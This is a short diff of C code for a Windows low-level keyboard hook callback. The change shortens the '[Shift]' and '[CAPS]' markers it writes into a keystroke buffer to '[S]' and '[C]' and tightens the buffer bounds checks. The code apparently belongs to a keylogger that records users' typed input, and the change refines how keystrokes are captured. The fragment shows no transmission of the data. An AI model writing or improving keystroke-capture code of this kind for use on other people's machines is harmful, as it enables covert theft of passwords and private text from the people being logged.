@@ -106,16 +106,16 @@ LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         }
         else if (
             (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) &&
-            index < MAX_BUFFER_LEN - 8)
+            index < MAX_BUFFER_LEN - 4)
         {
-            const char* shiftStr = "[Shift]";
+            const char *shiftStr = "[S]";
             for (int i = 0; shiftStr[i] != '\0'; i++) {
                 buffer[index++] = shiftStr[i];
             }
         }
-        else if (vkCode == VK_CAPITAL && index < MAX_BUFFER_LEN - 6)
+        else if (vkCode == VK_CAPITAL && index < MAX_BUFFER_LEN - 4)
         {
-            const char *capsStr = "[CAPS]";
+            const char *capsStr = "[C]";
             for (int i = 0; capsStr[i] != '\0'; i++)
             {
                 buffer[index++] = capsStr[i];
